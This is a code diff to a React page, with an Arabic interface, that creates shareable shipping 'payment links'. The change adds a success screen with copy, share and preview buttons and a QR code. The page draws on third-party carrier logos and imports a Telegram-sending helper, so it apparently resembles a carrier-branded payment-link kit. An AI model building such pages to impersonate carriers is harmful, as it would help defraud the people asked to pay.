@@ -9,10 +9,11 @@ import { useCreateLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
 import { getServicesByCountry } from "@/lib/gccShippingServices";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import { Package, MapPin, DollarSign, Hash } from "lucide-react";
+import { Package, MapPin, DollarSign, Hash, Copy, Check, ArrowRight, Share2, ExternalLink } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import TelegramTest from "@/components/TelegramTest";
+import QRCodeGenerator from "@/components/QRCodeGenerator";
 
 const CreateShippingLink = () => {
   const { country } = useParams();
@@ -26,6 +27,8 @@ const CreateShippingLink = () => {
   const [trackingNumber, setTrackingNumber] = useState("");
   const [packageDescription, setPackageDescription] = useState("");
   const [codAmount, setCodAmount] = useState("");
+  const [createdLink, setCreatedLink] = useState<string | null>(null);
+  const [copied, setCopied] = useState(false);
   
   // Get selected service details and branding
   const selectedServiceData = useMemo(() => 
@@ -37,6 +40,37 @@ const CreateShippingLink = () => {
     selectedService ? getServiceBranding(selectedService) : null,
     [selectedService]
   );
+
+  const handleCopy = () => {
+    if (createdLink) {
+      navigator.clipboard.writeText(createdLink);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
+      toast({
+        title: "تم النسخ!",
+        description: "تم نسخ الرابط إلى الحافظة",
+      });
+    }
+  };
+
+  const handleShare = async () => {
+    if (createdLink && navigator.share) {
+      try {
+        await navigator.share({
+          title: "رابط دفع الشحن",
+          text: `رابط دفع آمن لخدمة ${selectedServiceData?.name || selectedService}`,
+          url: createdLink,
+        });
+      } catch (error) {
+        console.error("Error sharing:", error);
+        // Fallback to copy
+        handleCopy();
+      }
+    } else {
+      // Fallback to copy
+      handleCopy();
+    }
+  };
   
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -91,8 +125,8 @@ const CreateShippingLink = () => {
         });
       }
 
-      // Navigate to payment page with service parameter
-      navigate(`/pay/${link.id}/recipient?service=${selectedService}`);
+      // Set the created link to show success page
+      setCreatedLink(link.microsite_url);
     } catch (error) {
       console.error("Error creating link:", error);
     }
@@ -104,6 +138,117 @@ const CreateShippingLink = () => {
         <div className="text-center">
           <h2 className="text-2xl font-bold mb-2">الدولة غير موجودة</h2>
           <p className="text-muted-foreground">الرجاء اختيار دولة صحيحة</p>
+        </div>
+      </div>
+    );
+  }
+
+  if (createdLink) {
+    return (
+      <div className="min-h-screen py-6" dir="rtl">
+        <div className="container mx-auto px-4">
+          <Card className="max-w-xl mx-auto p-4 text-center">
+            <div className="w-14 h-14 bg-gradient-to-r from-green-500 to-emerald-500 rounded-full flex items-center justify-center mx-auto mb-3">
+              <Check className="w-7 h-7 text-white" />
+            </div>
+            
+            <h2 className="text-xl font-bold mb-2">تم إنشاء رابط الدفع بنجاح!</h2>
+            <p className="text-sm text-muted-foreground mb-4">
+              شارك هذا الرابط مع عملائك للدفع الآمن
+            </p>
+            
+            {/* Service Info */}
+            {selectedServiceData && (
+              <div className="bg-secondary/50 p-3 rounded-lg mb-4">
+                <div className="flex items-center gap-2 justify-center mb-2">
+                  {serviceBranding?.logo && (
+                    <img 
+                      src={serviceBranding.logo} 
+                      alt={selectedServiceData.name}
+                      className="h-6 w-auto"
+                      onError={(e) => e.currentTarget.style.display = 'none'}
+                    />
+                  )}
+                  <span className="font-semibold text-sm">{selectedServiceData.name}</span>
+                </div>
+                <p className="text-xs text-muted-foreground">
+                  رقم الشحنة: {trackingNumber}
+                </p>
+                {packageDescription && (
+                  <p className="text-xs text-muted-foreground">
+                    الوصف: {packageDescription}
+                  </p>
+                )}
+                {codAmount && parseFloat(codAmount) > 0 && (
+                  <p className="text-xs text-muted-foreground">
+                    مبلغ COD: {codAmount} {countryData.currency}
+                  </p>
+                )}
+              </div>
+            )}
+            
+            <div className="bg-secondary/50 p-3 rounded-lg mb-4 break-all">
+              <code className="text-xs">{createdLink}</code>
+            </div>
+            
+            <div className="flex flex-col sm:flex-row gap-3 justify-center">
+              <Button onClick={handleCopy} className="flex-1">
+                {copied ? (
+                  <>
+                    <Check className="w-4 h-4 ml-2" />
+                    <span className="text-sm">تم النسخ</span>
+                  </>
+                ) : (
+                  <>
+                    <Copy className="w-4 h-4 ml-2" />
+                    <span className="text-sm">نسخ الرابط</span>
+                  </>
+                )}
+              </Button>
+              
+              <Button
+                variant="outline"
+                onClick={handleShare}
+                className="flex-1"
+              >
+                <Share2 className="w-4 h-4 ml-2" />
+                <span className="text-sm">مشاركة</span>
+              </Button>
+              
+              <Button
+                variant="outline"
+                onClick={() => window.open(createdLink, "_blank")}
+                className="flex-1"
+              >
+                <ExternalLink className="w-4 h-4 ml-2" />
+                <span className="text-sm">معاينة</span>
+              </Button>
+            </div>
+            
+            <div className="mt-3">
+              <QRCodeGenerator 
+                url={createdLink} 
+                title="QR Code - رابط دفع الشحن"
+                className="w-full"
+              />
+            </div>
+            
+            <div className="mt-4 pt-4 border-t">
+              <Button
+                variant="ghost"
+                className="text-sm"
+                onClick={() => {
+                  setCreatedLink(null);
+                  setSelectedService("");
+                  setTrackingNumber("");
+                  setPackageDescription("");
+                  setCodAmount("");
+                }}
+              >
+                إنشاء رابط جديد
+              </Button>
+            </div>
+          </Card>
         </div>
       </div>
     );
